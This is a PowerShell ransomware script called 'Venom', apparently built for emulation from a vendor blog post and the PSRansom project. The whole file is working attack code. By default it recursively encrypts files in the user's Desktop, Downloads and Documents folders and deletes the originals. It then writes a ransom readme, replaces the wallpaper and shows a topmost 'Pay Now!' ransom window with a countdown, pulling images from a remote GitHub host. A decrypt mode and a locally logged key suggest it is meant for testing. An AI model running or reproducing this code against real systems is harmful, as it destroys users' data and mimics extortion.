# venom.ps1
# Modeled after https://www.sonicwall.com/blog/ransomware-delivered-through-github-a-powershell-powered-attack and https://github.com/JoelGMSec/PSRansom/blob/main/PSRansom.ps1
# Functions copied from PSRansom: Invoke-AESEncryption, RemoveWallpaper, PopUpRansom, R64Encoder, CreateReadme
# 
param(
    [string]$TargetPath,
    [switch]$DryRun,
    [switch]$Recurse,
    [switch]$Metrics,
    [switch]$Decrypt,
    [switch]$Entangle
)

$Recurse = $true
if (!$Decrypt) {
    $Entangle = $true
}
#Variables
$user = ([Environment]::UserName).ToLower()
$computer = ([Environment]::MachineName).ToLower()
$Readme = "readme.txt"
$Time = Get-Date -Format "HH:mm - dd/MM/yy"
$TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
$stageDir = "c:\temp"
$readmePath = Join-Path $stageDir -ChildPath $Readme
$logFile = "c:\venom\venom_log.txt"
$ran_extension = ".venom"
$extension_exclusion = @('*.exe','*.lnk','*.dll','*.bin','*.bat','*.cmd','*.sys','*.inf','*.vxd','*.ini','*.cfg','*.reg','*.hiv','*.venom','venom*','spawn.ps1','*.dat','*.msi','readme.txt','*.ls','*.acm','*.efi','*.mui')
$exclude_scripts = @('*.ps1','*.py','*.cs','*.js','*.zip')
$extension_exclusion += "*.$($ran_extension)"
$extension_exclusion += $exclude_scripts

#Functions
Function Ensure-PowerShell7 {
    if ($PSVersionTable.PSVersion.Major -ge 7) { return }

    Write-Host 'PowerShell 7 not found. Attempting installation...' -ForegroundColor Yellow

    # Try winget first (modern Windows)
    if (Get-Command winget -ErrorAction SilentlyContinue) {
        Start-Process winget -ArgumentList 'install --id Microsoft.PowerShell --source winget -e --silent --accept-package-agreements --accept-source-agreements' -Wait -NoNewWindow
    }
    else {
        # Fallback to MSI download
        Write-Host "Winget PWSH failed. Attempting MSI fallback"
        $msi = "$env:TEMP\PowerShell7.msi"
        Invoke-WebRequest 'https://github.com/PowerShell/PowerShell/releases/download/v7.6.1/PowerShell-7.6.1-win-x64.msi' -OutFile $msi
        Start-Process msiexec.exe -ArgumentList "/i `"$msi`" /qn" -Wait
    }

    Write-Host 'Restarting script under PowerShell 7...' -ForegroundColor Green
    pwsh -File $MyInvocation.MyCommand.Path @args
    exit
}

Function Start-Metrics { return [System.Diagnostics.Stopwatch]::StartNew() }
Function Stop-Metrics($sw){ $sw.Stop(); return $sw.Elapsed }

function Write-Log {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Message,
        [string]$LogPath
    )
    $timestamp = Get-Date -Format "yyyy-MM-ddTHHmmss"
    $fullMessage = "$timestamp | $Message"
    Add-Content -Path $logPath -Value $fullMessage
}

# AES-256-GCM with PBKDF2-HMAC-SHA256

Function Get-DerivedKey {
    param(
        [Parameter(Mandatory)] [securestring]$Password,
        [byte[]]$Salt,
        [int]$Iterations = 600000,
        [int]$KeySizeBytes = 32
    )
    $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
    try {
        $pwdBytes = [System.Text.Encoding]::UTF8.GetBytes([Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr))
        $pbkdf2 = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($pwdBytes, $Salt, $Iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
        return $pbkdf2.GetBytes($KeySizeBytes)
    } finally {
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
    }
}


Function Invoke-Venom {
    param(
        [Parameter(Mandatory)] [string]$InputFile,
        [Parameter(Mandatory)] [securestring]$Password,
        [int]$Iterations = 600000
    )
    if ($InputFile) {
        $File = Get-Item -Path $InputFile -ErrorAction SilentlyContinue
        if (!$File.FullName) {break}
    }
    $salt = New-Object byte[] 16; [System.Security.Cryptography.RandomNumberGenerator]::Fill($salt)
    $nonce = New-Object byte[] 12; [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
    $key = Get-DerivedKey -Password $Password -Salt $salt -Iterations $Iterations
    $plaintext = [IO.File]::ReadAllBytes($File.FullName)
    $cipher = New-Object byte[] $plaintext.Length
    $tag = New-Object byte[] 16
    $aes = [System.Security.Cryptography.AesGcm]::new($key)
    $aes.Encrypt($nonce, $plaintext, $cipher, $tag, $null)
    $out = "$File.FullName" + $ran_extension
    $fs = [IO.File]::OpenWrite($out)
    try {
        $fs.Write([BitConverter]::GetBytes([int]$Iterations),0,4)
        $fs.Write($salt,0,$salt.Length)
        $fs.Write($nonce,0,$nonce.Length)
        $fs.Write($tag,0,$tag.Length)
        $fs.Write($cipher,0,$cipher.Length)
    } finally { $fs.Close() }
}

Function Invoke-Antivenom {
    param(
        [Parameter(Mandatory)] [string]$EncryptedFile,
        [Parameter(Mandatory)] [securestring]$Password
    )
    if ($EncryptedFile) {
        $File = Get-Item -Path $EncryptedFile -ErrorAction SilentlyContinue
        if (!$File.FullName) {break}
    }
    $bytes = [IO.File]::ReadAllBytes($File.FullName)
    $iter = [BitConverter]::ToInt32($bytes,0)
    $salt = $bytes[4..19]
    $nonce = $bytes[20..31]
    $tag = $bytes[32..47]
    $cipher = $bytes[48..($bytes.Length-1)]
    $key = Get-DerivedKey -Password $Password -Salt $salt -Iterations $iter
    $plain = New-Object byte[] $cipher.Length
    $aes = [System.Security.Cryptography.AesGcm]::new($key)
    $aes.Decrypt($nonce, $cipher, $tag, $plain, $null)
    $out = $EncryptedFile -replace '\.venom$',''
    [IO.File]::WriteAllBytes($out,$plain)
}

function EncryptFiles {
    param([switch]$AutoGenerateKey, [string[]]$TargetFiles)
    if ($AutoGenerateKey) {
        $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
    }
    elseif ($PSRKey) {
    }
    else {
        $PSRKey = Read-Host -Prompt "Provide Key/Password" -AsSecureString
    }
    foreach($i in $TargetFiles){
        Write-Host "Biting $i"
        try {
            Invoke-Venom -InputFile $i.FullName -Password $PSRKey -ErrorAction SilentlyContinue; Add-Content -Path $readmePath -Value "[!] $i is now encrypted" ; Write-Log -LogPath $logFile -Message "[!] $i is now encrypted" ; Remove-Item $i -Force
        }
        catch {
            Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i -ErrorAction SilentlyContinue; Add-Content -Path $readmePath -Value "[!] $i is now encrypted";  Write-Log -LogPath $logFile -Message "[!] $i is now encrypted" ; Remove-Item $i -Force
        }
    }
    if (Test-Path $readmePath) {$RansomLogs = Get-Content "$readmePath" | Select-String "[!]" | Select-String "Venom!" -NotMatch}
    if (!$RansomLogs) { 
        Add-Content -Path "$readmePath" -Value "[!] No files have been encrypted!"
        Add-Content -Path "$logFile" -Value "[!] No files have been encrypted!"
    }
}

function RemoveWallpaper {
    $code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;
 
namespace CurrentUser { public class Desktop {
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;
public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;
public int[] first = {COLOR_DESKTOP};

public static void RemoveWallPaper(){
SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
regkey.SetValue(@"WallPaper", 0); regkey.Close();}

public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};

RemoveWallPaper();
System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);
int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };

SetSysColors(elements.Length, elements, colors);
RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
key.Close();}}}
 
"@
    try { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }
    finally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}
}

function PopUpRansom {
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
    [void] [System.Windows.Forms.Application]::EnableVisualStyles() 

    try {Invoke-WebRequest -useb https://raw.githubusercontent.com/theblueshadow48/shiny-dollop/Venom.jpg -Outfile $env:temp\venom.jpg}
    catch {if(Test-Path "$PSScriptRoot\venom.jpg") {Copy-Item -Path "$PSScriptRoot\venom.jpg" -Destination $env:temp\venom.jpg}}
    try {Invoke-WebRequest -useb https://raw.githubusercontent.com/theblueshadow48/shiny-dollop/Venom.ico -Outfile $env:temp\venom.ico}
    catch {if(Test-Path "$PSScriptRoot\venom.ico") {Copy-Item -Path "$PSScriptRoot\venom.ico" -Destination $env:temp\venom.ico}}
    $shell = New-Object -ComObject "Shell.Application"
    $shell.minimizeall()

    $form = New-Object system.Windows.Forms.Form
    $form.ControlBox = $false;
    $form.Size = New-Object System.Drawing.Size(900,600) 
    $form.BackColor = "Black" 
    $form.MaximizeBox = $false 
    $form.StartPosition = "CenterScreen" 
    $form.WindowState = "Normal"
    $form.Topmost = $true
    $form.FormBorderStyle = "Fixed3D"
    $formIcon = New-Object system.drawing.icon ("$env:temp\venom.ico") 
    $form.Icon = $formicon  

    $img = [System.Drawing.Image]::Fromfile("$env:temp\venom.jpg")
    $pictureBox = new-object Windows.Forms.PictureBox
    $pictureBox.Width = 920
    $pictureBox.Height = 370
    $pictureBox.SizeMode = "StretchImage"
    $pictureBox.Image = $img
    $form.controls.add($pictureBox)

    $label = New-Object System.Windows.Forms.Label
    $label.ForeColor = "Cyan"
    $label.Text = "All your files have been encrypted by Venom!" 
    $label.AutoSize = $true 
    $label.Location = New-Object System.Drawing.Size(50,400) 
    $font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
    $form.Font = $Font 
    $form.Controls.Add($label) 

    $label1 = New-Object System.Windows.Forms.Label
    $label1.ForeColor = "White"
    $label1.Text = "But don't worry, you can still recover them with the recovery key :)" 
    $label1.AutoSize = $true 
    $label1.Location = New-Object System.Drawing.Size(50,450)
    $font1 = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
    $form.Font = $Font1
    $form.Controls.Add($label1) 

    $okbutton = New-Object System.Windows.Forms.Button;
    $okButton.Location = New-Object System.Drawing.Point(750,500)
    $okButton.Size = New-Object System.Drawing.Size(300,35)
    $okbutton.ForeColor = "Black"
    $okbutton.BackColor = "White"
    $okbutton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
    $okButton.Text = 'Pay Now!'
    $okbutton.Visible = $false
    $okbutton.Enabled = $true
    $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
    $okButton.add_Click({ 
    [System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been registered!', 'Venom Payment System',
    [Windows.Forms.MessageBoxButtons]::"OK", [Windows.Forms.MessageBoxIcon]::"Warning")})
    $form.AcceptButton = $okButton
    $form.Controls.Add($okButton)
    $form.Activate() 2>&1> $null
    $form.Focus() 2>&1> $null

    $btn=New-Object System.Windows.Forms.Label
    $btn.Location = New-Object System.Drawing.Point(50,500)
    $btn.Width = 500
    $form.Controls.Add($btn)
    $btn.ForeColor = "Red"
    $startTime = [DateTime]::Now
    $count = 10.6
    $timer=New-Object System.Windows.Forms.Timer
    $timer.add_Tick({$elapsedSeconds = ([DateTime]::Now - $startTime).TotalSeconds ; $remainingSeconds = $count - $elapsedSeconds
    if ($remainingSeconds -like "-0.1*"){ $timer.Stop() ; $okbutton.Visible = $true ; $btn.Text = "0 Seconds remaining.." }
    $btn.Text = [String]::Format("{0} Seconds remaining..", [math]::round($remainingSeconds))})
    $timer.Start()

    $btntest = $form.ShowDialog()
    if ($btntest -like "OK"){ $Global:PayNow = "True" }
}

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet("Encrypt", "Decrypt")]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path)

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $normalizedKey = $Key.Trim()
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normalizedKey))
        switch ($Mode) {

            "Encrypt" {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

                if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName + $ran_extension }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}

            "Decrypt" {
                Write-Host "AES Decryption Selected" -ForegroundColor Green
                Write-Log -LogPath $logFile -Message "AES Decryption Selected"
                if ($Text) {Write-Host "Attempting to AES Decrypt TMKey"; $cipherBytes = [System.Convert]::FromBase64String($Text)}

                if ($Path) {
                Write-Host "Attempting to AES Decrypt $Path" -ForegroundColor Cyan
                Write-Log -LogPath $logFile -Message "Attempting to AES Decrypt $Path"
                #$File = Get-Item -Path $Path
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { Write-Host "Could not find file" -ForegroundColor Red; break }
                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName.replace($ran_extension,"") }
                #Write-Host "Outpath is $outPath"

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                try {
                    $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                }
                catch [System.Security.Cryptography.CryptographicException] {
                    Write-Log -LogPath $logFile -Message "ERROR | AES verification failed. Wrong key, IV, or corrupted data"
                }
                #$aesManaged.Dispose()
                if (!$decryptedBytes) {Write-Host "Failed to Decrypt File $($File.FullName)" -ForegroundColor Red} else {Write-Host "Decrypted Bytes"}
                #if ($Text) {Write-Host "Inside text"; return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                if ($Text) {Write-Host "Inside text"; return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)}
                if ($Path) {
                    try {
                        [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                        Write-Host "$outPath | Bytes Written: $decryptedBytes" -ForegroundColor Magenta
                    }
                    catch { $_ | Format-List * -Force; Write-Host "Failed to Write $outPath" -ForegroundColor Red}
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    Write-Host "Successfully recovered $outPath" -ForegroundColor Green
                    Write-Log -LogPath $logFile -Message "Successfully recovered $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()}
    }

function R64Encoder { 
    if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
    if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
    $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
    $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base 
}

function CreateReadme {
    $ReadmeTXT = "All your files have been encrypted by Venom!`nBut don't worry, you can still recover them with the recovery key :)`n"
    if (!(Test-Path $readmePath)) { Add-Content -Path $readmePath -Value $ReadmeTXT;
    Add-Content -Path $readmePath -Value "Recovery Key: $PSRKey `n" }
    if (!(Test-Path $logFile)) {Write-Log -LogPath $logFile -Message "Recovery Key: $PSRKey `n"}
}

<#
try {
    Ensure-PowerShell7
}
catch {
}
#>
#Ensure-PowerShell7

#Import-Module "$PSScriptRoot/CryptoUtils.psm1"
#Import-Module "$PSScriptRoot/Metrics.psm1"


if($Metrics){$sw = Start-Metrics}


Write-Log -LogPath $logFile -Message "Generating Recovery Key..."
if (!$Decrypt) {
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
    Write-Log -LogPath $logFile -Message "Recovery Key: $PSRKey"
    Write-Log -LogPath $logFile -Message "TMKey: $TMKey"
}
if ($Decrypt) {
    $decrypt_key = Read-Host -Prompt "Enter Decrypt Key" -AsSecureString
    #$Recovery_Key = Read-Host -Prompt "Enter the Recovery Key (TMKey) for AES Decryption" -AsSecureString
}
if (!$TargetPath) {
    $userDir=$env:UserProfile
    $subDirList = @('\Desktop','\Downloads','\Documents')
    foreach($subdir_name in $subDirList) {
        $user_targetdir = $userDir + $subdir_name
        #Write-Host "Iterating through Directory: $user_targetdir"
        if (Test-Path -LiteralPath $user_targetdir -ErrorAction SilentlyContinue) {
            if ($Decrypt) {
                #$decrypt_key = Read-Host -Prompt "Enter Decrypt Key" -AsSecureString
                #$Recovery_Key = Read-Host -Prompt "Enter the Recovery Key (TMKey) for AES Decryption" -AsSecureString
                Write-Host "Applying antivenom to $user_targetdir"; Write-Log -LogPath $logFile -Message "Applying antivenom to $user_targetdir"
                $items = if($Recurse){Get-ChildItem $user_targetdir -Recurse -File -Filter '*.venom'} else {Get-Item $user_targetdir}
                foreach($i in $items){
                    #Write-Host "Debiting $i"
                    #Write-Log -LogPath $logFile -Message "Debite $i";
                    try{
                        Write-Host "Invoking AES Decryption on $i"
                        Write-Log -LogPath $logFile -Message "Invoking AES Decryption on $i"
                        Invoke-AESEncryption -Mode Decrypt -Key $decrypt_key -Path $i.FullName
                        #Invoke-AESEncryption -Mode Decrypt -Key $decrypt_key -Path $i.FullName -Text $Recovery_Key 
                    }
                    catch{
                        $_ | Format-List * -Force;
                        if ($PSVersionTable.PSVersion.Major -ge 7) {
                            Write-Host "Invoking Antivenom on $i"
                            Write-Log -LogPath $logFile -Message "Invoking Antivenom on $i"
                            Invoke-Antivenom -EncryptedFile $i.FullName -Password $decrypt_key
                        }
                    };
                    #$rfile = $i.replace($ran_extension,"");
                    #if(Test-Path $rfile){Remove-Item $i.FullName;Write-Host "Successfully retrieved file: $rfile"}
                }
            }
            else {
                Write-Host "Injecting venom on $user_targetdir"; Write-Log -LogPath $logFile -Message "Injecting venom on $user_targetdir"
                $items = if($Recurse) {Get-ChildItem $user_targetdir -Recurse -File -Exclude $extension_exclusion} elseif($user_targetdir) {if(Test-Path -Path $user_targetdir -PathType Leaf) {Get-Item $user_targetdir}} else {Get-ChildItem $user_targetdir -File -Exclude $extension_exclusion}
                if ($items) {EncryptFiles -TargetFiles $items -PKey $PSRKey} else {Write-Log $logFile -Message "No viable files found in $user_targetdir"}
                CreateReadme
            }
        }
    }
}
else {
    if (Test-Path -LiteralPath $TargetPath -ErrorAction SilentlyContinue) {
        if ($Decrypt) {
            $decrypt_key = Read-Host -Prompt "Enter Decrypt Key" -AsSecureString
            Write-Host "Applying antivenom to $TargetPath"
            $items = if($Recurse){Get-ChildItem $TargetPath -Recurse -File -Filter '*.venom'} else {Get-Item $TargetPath}
            foreach($i in $items){Write-Log -LogPath $logFile -Message "Debite $i"; try{$Recovery_Key = Read-Host -Prompt "Enter the Recovery Key (TMKey) for AES Decryption" -AsSecureString;Invoke-AESEncryption -Mode Decrypt -Text $Recovery_Key -Key $decrypt_key -Path $i.FullName}catch{Invoke-Antivenom -EncryptedFile $i.FullName -Password $decrypt_key};$rfile = $i.replace($ran_extension,"");if(Test-Path $rfile){Remove-Item $i.FullName}}
        }
        else {
            Write-Host "Injecting venom on $TargetPath"
            $items = if($Recurse) {Get-ChildItem $TargetPath -Recurse -File -Exclude $extension_exclusion} elseif(Test-Path -Path $TargetPath -PathType Leaf) {Get-Item $TargetPath} else {Get-ChildItem $TargetPath -File -Exclude $extension_exclusion}
            if ($items) {EncryptFiles -TargetFiles $items -PKey $PSRKey} else {Write-Log $logFile -Message "No viable files found in $TargetPath"}
            CreateReadme
        }
    }
}


if (-not (Test-Path -Path "c:\venom" -PathType Container)) {
    New-Item -Path "c:\venom" -ItemType Directory
}
if ($Entangle) {RemoveWallpaper; PopUpRansom}
#Copy files to c:\venom
Copy-Item -Path "$stageDir\*" -Destination "c:\venom" -Recurse -Force
Copy-Item -Path $PSCommandPath -Destination "c:\venom" -Force
Remove-Item "$env:temp\venom*" -Force
Remove-Item -Path "$stageDir\*" -Force
